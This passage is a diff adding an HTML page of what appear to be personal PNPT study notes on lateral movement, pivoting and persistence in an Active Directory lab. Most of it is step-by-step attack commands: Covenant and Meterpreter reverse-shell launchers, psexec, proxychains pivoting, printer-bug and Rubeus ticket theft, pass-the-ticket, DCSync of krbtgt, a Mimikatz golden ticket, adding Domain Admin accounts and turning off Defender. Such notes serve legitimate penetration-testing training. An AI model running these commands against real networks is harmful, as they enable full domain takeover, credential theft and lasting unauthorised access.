+</span><span class="n">search</span><span class="w"> </span><span class="nx">socks</span><span class="w">
+</span><span class="n">use</span><span class="w"> </span><span class="nx">auxiliary/server/socks4a</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">srvport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nx">same</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">/etc/proxychains4.conf</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Done, now we will generate traffic from this internal network to our kali.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>workstation-02 &gt; workstation-01 &gt; kali
+the traffic will pass through workstation-01 that we have directly access.
+</code></pre></div></div>
+
+<h2 id="gaining-a-shell-on-an-internal-workstation">Gaining a Shell on an Internal Workstation</h2>
+<p><strong>In Covenant</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Listeners</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Reverse</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">BindPort</span><span class="o">=</span><span class="mi">443</span><span class="p">(</span><span class="n">port</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">listening</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ConnectPort</span><span class="o">=</span><span class="mi">2222</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">ConnectAddresses</span><span class="o">=</span><span class="err">&lt;</span><span class="n">workstation-01</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">create</span><span class="w">
+
+</span><span class="n">Launchers</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Reverse</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net40</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Generate</span><span class="w">
+</span><span class="n">Host</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/rev1.ps1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Host</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Copy</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="nx">payload</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>In Metasploit</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="w"> </span><span class="nx">exploit/windows/smb/psexec</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">options</span><span class="w"> </span><span class="c"># but we dont know the RHOSTS of worksation-02</span><span class="w">
+
+</span><span class="c"># we can open the session of workstation-01 and ping workstation-02 to know the IP</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">windows/x64/exec</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">paste</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">covenant</span><span class="w"> </span><span class="nx">here</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>we should gain a shell in the Covenant Listener
+its SYSTEM integrity but SessionID=0
+we can try to improve to a SessionID=1</p>
+</blockquote>
+
+<h2 id="remoting-through-proxychains">Remoting Through ProxyChains</h2>
+<p><strong>In Covenant system shell</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PowerShellRemotingCommand</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computername</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="s2">"command"</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">
+</span><span class="s2">"command can be reverse http from listener"</span><span class="w">
+</span><span class="c"># we should get a shell with high integrity and user2 access.</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>in Kali</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">proxychains</span><span class="w"> </span><span class="nx">xfreerdp</span><span class="w"> </span><span class="nx">/u:</span><span class="err">&lt;</span><span class="nx">user2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/p:</span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nx">/v:</span><span class="err">&lt;</span><span class="nx">workstation-02</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/d:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>In order to this process work: we need <strong>socks proxy</strong> set in metasploit, <strong>autoroute</strong> and <strong>portfwd</strong> too cause we are accessing a machine in another network.</p>
+</blockquote>
+
+<ul>
+  <li>gain access to workstation-02</li>
+  <li>we can go further and pivot to DC01 through Remote Desktop</li>
+</ul>
+
+<h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
+
+<blockquote>
+  <p>[Note] that the following command needs to be ran from an Administrator/elevated Powershell prompt on DC01 as well prior to doing this lesson</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">Workstation-02</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Set-ADAccountControl</span><span class="w"> </span><span class="nt">-TrustedForDelegation</span><span class="w"> </span><span class="bp">$true</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Bloodhound</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">analysis</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shortest</span><span class="w"> </span><span class="nx">paths</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">unconstrained</span><span class="w"> </span><span class="nx">delagation</span><span class="w"> </span><span class="nx">systems</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>In Covenant system/0 shell</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">upload</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\users\public\ms-rprn.exe</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="nx">ms-rprn.exe</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">execute</span><span class="w">
+</span><span class="n">ChangeDirectory</span><span class="w"> </span><span class="nx">C:\users\public</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">ms-rprn.exe</span><span class="w"> </span><span class="nx">\\TargetServer</span><span class="w"> </span><span class="nx">\\targetHost</span><span class="w">
+</span><span class="n">PowerShellImport</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">PowerView_dev.ps1</span><span class="w">
+</span><span class="n">Powershell</span><span class="w"> </span><span class="nx">get-netcomputer</span><span class="w"> </span><span class="nt">-unconstrained</span><span class="w"> </span><span class="nt">-properties</span><span class="w"> </span><span class="nx">dnshostname</span><span class="w">
+</span><span class="c"># it shows the hostnames that have unconstrained delegation</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shell</span><span class="w"> </span><span class="nx">ms-rprn.exe</span><span class="w"> </span><span class="nx">\\DC01</span><span class="w"> </span><span class="nx">\\workstation-02</span><span class="w">
+</span><span class="n">rubeus</span><span class="w"> </span><span class="nx">dump</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w">
+</span><span class="c"># copy the Base64EncodedTicket from DC01$ </span><span class="w">
+</span><span class="c"># take the spaces off</span><span class="w">
+
+</span><span class="n">maketoken</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">whateverForPassword</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="c"># copy the kerberos ticket</span><span class="w">
+</span><span class="n">rubeus</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:</span><span class="err">&lt;</span><span class="nx">paste</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">ticket</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="c"># Output: [+]  Ticket Successfully imported!</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>This means this session is acting as domain controller, we have full domain rights</p>
+</blockquote>
+
+<p>POC - Create a user and add him to Domain Admins group:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shell</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user3</span><span class="err">&gt;</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user3</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">user3</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To dump the full SAM account of krbtgt:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dcsync</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain\krbtgt</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="golden-ticket-persistence">Golden TIcket Persistence</h2>
+<p>workstation-01 Covenant shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Upload &gt; C:\users\public\</span><span class="w">
+</span><span class="n">invoke-mimikatz.ps1</span><span class="w">
+</span><span class="nx">powerview.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\users\public</span><span class="w">
+</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\powerview.ps1</span><span class="w">
+</span><span class="nx">get-domainsid</span><span class="w">
+</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\invoke-mimikatz.ps1</span><span class="w">
+</span><span class="nx">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:administrator /domain:&lt;domain&gt; /sid:&lt;get-domainsid output&gt; /krbtgt:&lt;kerberos ticket, maybe its saved in Covenant - Data&gt; /ptt"'</span><span class="w">
+</span><span class="c"># ptt = pass the ticket</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>At this point we are administrator of the DC - free access:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ls</span><span class="w"> </span><span class="nx">\\dc01\c</span><span class="err">$</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"domain admins"</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user4</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="reverse-port-forwarding-for-shell-on-dc01">Reverse Port Forwarding for Shell on DC01</h2>
+<p>Make sure WDefender are off</p>
+
+<p>We need to have 3 listener <strong>in Covenant</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="nx">Listener</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">ConnectAddress</span><span class="o">=</span><span class="w"> </span><span class="n">kali</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">Port</span><span class="o">=</span><span class="mi">80</span><span class="w"> 
+</span><span class="c">#External = its used to get workstation-01 access</span><span class="w">
+
+</span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">Reverse</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">ConnectAddress</span><span class="o">=</span><span class="w"> </span><span class="n">workstation-01</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">port</span><span class="o">=</span><span class="mi">2222</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">bindport</span><span class="o">=</span><span class="mi">443</span><span class="w">
+</span><span class="c"># Internal - its used to get workstation-02 access through workstation-01 portfwd</span><span class="w">
+
+</span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="nx">listener2</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">ConnectAddress</span><span class="o">=</span><span class="n">workstation-01</span><span class="p">(</span><span class="n">secure</span><span class="p">)</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">port</span><span class="o">=</span><span class="mi">2223</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">binport</span><span class="o">=</span><span class="mi">8082</span><span class="w">
+</span><span class="c"># Secure - its used to get domain access through workstation-01 portfwd</span><span class="w">
+
+</span><span class="c"># Create a powershell launcher \for each of the listeners</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>msfconsole</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="w"> </span><span class="nx">exploit/multi/script/web_delivery</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">\for</span><span class="w"> </span><span class="nx">powershell</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">windows/x64/meterpreter/reverse_tcp</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">lhost</span><span class="p">,</span><span class="w"> </span><span class="nx">lport</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span><span class="c"># copy the payload and run in workstation-01</span><span class="w">
+
+</span><span class="n">ipconfig</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Here we can see, that we need to setup 2 routes. 
+Cause there is 2 more networks besides the external one.</p>
+</blockquote>
+
+<blockquote>
+  <p>external - internal - secure</p>
+</blockquote>
+
+<p><strong>meterpreter session</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">run</span><span class="w"> </span><span class="nx">autoroute</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">internal</span><span class="w"> </span><span class="nx">network</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="nf">16</span><span class="o">.</span><span class="nf">0</span><span class="n">/24</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">run</span><span class="w"> </span><span class="nx">autoroute</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">secure</span><span class="w"> </span><span class="nx">network</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10.120</span><span class="o">.</span><span class="nf">116</span><span class="o">.</span><span class="nf">0</span><span class="n">/24</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="n">portfwd</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">2222</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">portfwd</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">2223</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">8082</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">portfwd</span><span class="w"> </span><span class="c"># to show the port forwards actives</span><span class="w">
+</span><span class="c"># backgroud the session</span><span class="w">
+</span></code></pre></div></div>
+
+<p>use exploit/windows/smb/psexec</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span><span class="w"> </span><span class="nx">smbdomain</span><span class="p">,</span><span class="w"> </span><span class="nx">smbuser</span><span class="p">,</span><span class="w"> </span><span class="nx">smbpass</span><span class="p">,</span><span class="w"> </span><span class="nx">payload</span><span class="o">=</span><span class="n">windows/x64/exec</span><span class="p">,</span><span class="w"> </span><span class="nx">rhost</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Reverse</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">covenant</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">exploit</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>get a shell back from covenant - workstation-02 System</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span><span class="w"> </span><span class="nx">rhosts</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">pinging</span><span class="w"> </span><span class="nx">DC01</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">workstation-01</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reverse</span><span class="w"> </span><span class="nx">listener2</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">covenant</span><span class="w">
+</span><span class="n">exploit</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>get a shell back from covenant - DC01 - System</p>
+</blockquote>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#c2" class="page__taxonomy-item" rel="tag">c2</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pivot" class="page__taxonomy-item" rel="tag">pivot</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pnpt" class="page__taxonomy-item" rel="tag">pnpt</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-27T00:00:00+06:00">November 27, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=6+-+Movement%2C+Pivoting+and+Persistence%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fwpivoting%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fwpivoting%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fwpivoting%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/pnpt/winprivesc/" class="pagination--pager" title="5 - Windows Privilege Escalation
+">Previous</a>
+    
+    
+      <a href="/review/eewptx/" class="pagination--pager" title="Web application Penetration Tester eXtreme
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
